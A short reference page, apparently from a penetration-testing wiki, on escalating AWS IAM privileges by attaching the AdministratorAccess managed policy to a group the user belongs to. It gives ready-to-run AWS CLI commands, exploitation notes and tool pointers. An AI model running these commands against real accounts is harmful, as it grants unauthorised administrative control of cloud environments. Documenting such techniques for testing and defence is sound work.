---
title: "AttachGroupPolicy: attach a privileged policy to your group"
description: "iam:AttachGroupPolicy to attach a privileged managed policy to a group you belong to."
keywords:
  - AttachGroupPolicy
  - group
  - managed policy
  - AdministratorAccess
  - attach
---

# AttachGroupPolicy

`iam:AttachGroupPolicy` attaches a managed policy to a group. Because a user inherits every policy on the groups it belongs to, attaching `AdministratorAccess` to any group containing your user promotes you.

## Attach to your group

```bash
aws iam list-groups-for-user --user-name <you>
aws iam attach-group-policy --group-name <your-group> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Exploitation notes

- Confirm your membership first; the escalation only lands if your user is in the targeted group.
- Adding yourself to an already-privileged group instead is the [group membership](../group-membership.md) path.

## Tools

- **AWS CLI** (`iam attach-group-policy`).
- **Pacu** (`iam__privesc_scan`).

## References

- [Rhino Security Labs: AWS privilege escalation (AttachGroupPolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
